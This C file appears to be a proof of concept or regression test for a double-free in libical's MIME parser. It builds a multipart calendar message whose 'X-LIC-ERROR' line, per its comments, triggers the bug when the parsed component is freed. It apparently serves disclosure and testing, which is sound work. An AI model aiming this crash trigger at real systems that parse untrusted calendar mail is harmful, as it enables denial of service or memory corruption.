/*
 * SPDX-FileCopyrightText: 2025 Dhiraj Mishra <dhiraj@inputzero.io>
 * SPDX-License-Identifier: LGPL-2.1-only OR MPL-2.0
 *
 * Proof of Concept for double-free vulnerability in libical MIME parser
 *
 * The vulnerability occurs when parsing multipart MIME messages with
 * malformed calendar components that trigger error handling paths
 * leading to double-free of icalproperty objects.
 */

#include <stdio.h>
#include <string.h>
#include "ical.h"
#include "icalmime.h"

const char *mime_content =
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"frontier\"\r\n"
    "\r\n"
    "--frontier\r\n"
    "Content-Type: text/calendar\r\n"
    "\r\n"
    "BEGIN:VCALENDAR\r\n"
    "VERSION:2.0\r\n"
    "BEGIN:VEVENT\r\n"
    "UID:test@example.com\r\n"
    "DTSTART:20241230T100000Z\r\n"
    "X-LIC-ERROR:Malformed property\r\n" // This triggers the vulnerability
    "END:VEVENT\r\n"
    "END:VCALENDAR\r\n"
    "--frontier--\r\n";

struct test_data {
    const char *data;
    size_t pos;
};

char *line_generator(char *buf, size_t size, void *d)
{
    struct test_data *td = (struct test_data *)d;
    const char *start = td->data + td->pos;
    const char *end = strchr(start, '\n');

    if (!end || td->pos >= strlen(td->data)) {
        return NULL;
    }

    size_t len = (size_t)(ptrdiff_t)(end - start) + 1;
    if (len >= size)
        len = size - 1;

    memcpy(buf, start, len);
    buf[len] = '\0';

    td->pos += len;
    return buf;
}

int main(void)
{
    printf("Testing libical MIME parser double-free vulnerability...\n");

    icalerror_set_errors_are_fatal(0);

    struct test_data td = {mime_content, 0};

    icalcomponent *comp = icalmime_parse(line_generator, &td);

    if (comp) {
        printf("Component parsed, attempting to free...\n");
        icalcomponent_free(comp);
        printf("If you see this, the vulnerability was not triggered.\n");
    } else {
        printf("Failed to parse component.\n");
        return 1;
    }

    return 0;
}
